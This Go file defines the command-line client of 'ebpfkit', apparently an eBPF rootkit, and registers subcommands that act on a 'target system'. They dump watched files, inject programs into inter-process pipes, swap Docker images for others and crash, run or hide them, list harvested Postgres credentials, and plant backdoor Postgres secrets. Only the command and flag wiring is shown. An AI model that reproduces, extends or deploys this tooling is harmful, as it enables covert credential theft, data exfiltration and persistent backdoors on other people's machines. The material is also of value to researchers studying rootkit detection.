/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package run

import (
	"github.com/spf13/cobra"
)

// EBPFKitClient represents the base command of the ebpfKitClient
var EBPFKitClient = &cobra.Command{
	Use: "ebpfkit-client",
}

var cmdFSWatch = &cobra.Command{
	Use: "fs_watch",
}

var cmdPipeProg = &cobra.Command{
	Use: "pipe_prog",
}

var cmdDockerProg = &cobra.Command{
	Use: "docker",
}

var cmdPostgresProg = &cobra.Command{
	Use: "postgres",
}

var cmdAddFSWatch = &cobra.Command{
	Use:   "add [path of file]",
	Short: "add a filesystem watch",
	Long:  "add is used to add a filesystem watch on the target system",
	RunE:  addFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdDeleteFSWatch = &cobra.Command{
	Use:   "delete [path of file]",
	Short: "delete a filesystem watch",
	Long:  "delete is used to remove a filesystem watch on the target system",
	RunE:  deleteFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdGetFSWatch = &cobra.Command{
	Use:   "get [path of file]",
	Short: "get a filesystem watch",
	Long:  "get is used to dump a watched file from the target system",
	RunE:  getFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdPutPipeProg = &cobra.Command{
	Use:   "put [program]",
	Short: "put sends a program to pipe",
	Long:  "put is used to send a program and the command of the process you want to pipe it to on the target system",
	RunE:  putPipeProgCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdDelPipeProg = &cobra.Command{
	Use:   "delete",
	Short: "delete a piped program",
	Long:  "delete is used to delete a piped program on the target system",
	RunE:  delPipeProgCmd,
}

var cmdGetImagesList = &cobra.Command{
	Use:   "list",
	Short: "list container images",
	Long:  "list returns the list of Docker images detected",
	RunE:  getImagesListCmd,
}

var cmdPutDockerImageOverride = &cobra.Command{
	Use:   "put",
	Short: "put sends an image override request",
	Long:  "put is used to request that a Docker image is overridden on the target system",
	RunE:  putDockerImageOverrideCmd,
}

var cmdDelDockerImageOverride = &cobra.Command{
	Use:   "delete",
	Short: "delete removes a Docker image override request",
	Long:  "delete is used to stop overriding the provided Docker image on the target system",
	RunE:  delDockerImageOverrideCmd,
}

var cmdPostgresCredentialsList = &cobra.Command{
	Use:   "list",
	Short: "list postgres credentials",
	Long:  "list returns the list of the Postgres credentials detected on the target system",
	RunE:  getPostgresCredentialsCmd,
}

var cmdPutPGBackdoorSecret = &cobra.Command{
	Use:   "put",
	Short: "put overrides a set of Postgres credentials",
	Long:  "put is used to override a set of Postgres credentials on the target system (the provided role needs to exist)",
	RunE:  putPostgresRoleCmd,
}

var cmdDelPGBackdoorSecret = &cobra.Command{
	Use:   "delete",
	Short: "delete removes a set of Postgres credentials",
	Long:  "delete is used to remove a set of Postgres credentials from the target system",
	RunE:  delPostgresRoleCmd,
}

var options CLIOptions

func init() {
	EBPFKitClient.PersistentFlags().VarP(
		NewLogLevelSanitizer(&options.LogLevel),
		"log-level",
		"l",
		"log level, options: panic, fatal, error, warn, info, debug or trace")
	EBPFKitClient.PersistentFlags().VarP(
		NewTargetParser(&options.Target),
		"target",
		"t",
		"target application URL")

	cmdFSWatch.PersistentFlags().BoolVar(
		&options.InContainer,
		"in-container",
		false,
		"defines if the watched file is in a container")
	cmdFSWatch.PersistentFlags().BoolVar(
		&options.Active,
		"active",
		false,
		"defines if ebpfkit should passively wait for the file to be opened, or actively make a process open it")
	cmdFSWatch.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file to write into")

	cmdFSWatch.AddCommand(cmdAddFSWatch)
	cmdFSWatch.AddCommand(cmdDeleteFSWatch)
	cmdFSWatch.AddCommand(cmdGetFSWatch)
	EBPFKitClient.AddCommand(cmdFSWatch)

	cmdPipeProg.PersistentFlags().StringVar(
		&options.From,
		"from",
		"",
		"command of the program sending data over the pipe (16 chars, '#' is a forbidden char)")
	cmdPipeProg.PersistentFlags().StringVar(
		&options.To,
		"to",
		"",
		"command of the program reading data from the pipe (16 chars, '#' is a forbidden char)")
	cmdPipeProg.PersistentFlags().BoolVar(
		&options.Backup,
		"backup",
		false,
		"defines if ebpfkit should backup the original piped data and re-inject it after the provided program")

	cmdPipeProg.AddCommand(cmdPutPipeProg)
	cmdPipeProg.AddCommand(cmdDelPipeProg)
	EBPFKitClient.AddCommand(cmdPipeProg)

	cmdGetImagesList.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file to write into")
	cmdPutDockerImageOverride.PersistentFlags().StringVar(
		&options.From,
		"from",
		"",
		"defines the Docker image to override")
	cmdPutDockerImageOverride.PersistentFlags().StringVar(
		&options.To,
		"to",
		"",
		"defines the Docker image to override with")
	cmdPutDockerImageOverride.PersistentFlags().IntVar(
		&options.Override,
		"override",
		0,
		"defines the action to take: 0 for nop, 1 for replace")
	cmdPutDockerImageOverride.PersistentFlags().IntVar(
		&options.Ping,
		"ping",
		0,
		"defines the answer to give on a ping from the input Docker image: 0 for nop, 1 for crash, 2 for run and 3 for hide")
	cmdDelDockerImageOverride.PersistentFlags().StringVar(
		&options.From,
		"from",
		"",
		"defines the Docker image")

	cmdDockerProg.AddCommand(cmdGetImagesList)
	cmdDockerProg.AddCommand(cmdPutDockerImageOverride)
	cmdDockerProg.AddCommand(cmdDelDockerImageOverride)
	EBPFKitClient.AddCommand(cmdDockerProg)

	cmdPostgresCredentialsList.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file to write into")
	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Secret,
		"secret",
		"",
		"defines the Postgres secret to send")
	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Role,
		"role",
		"",
		"defines the Postgres role to send")
	cmdDelPGBackdoorSecret.PersistentFlags().StringVar(
		&options.Role,
		"role",
		"",
		"defines the Postgres role to delete")

	cmdPostgresProg.AddCommand(cmdPostgresCredentialsList)
	cmdPostgresProg.AddCommand(cmdPutPGBackdoorSecret)
	cmdPostgresProg.AddCommand(cmdDelPGBackdoorSecret)
	EBPFKitClient.AddCommand(cmdPostgresProg)

}
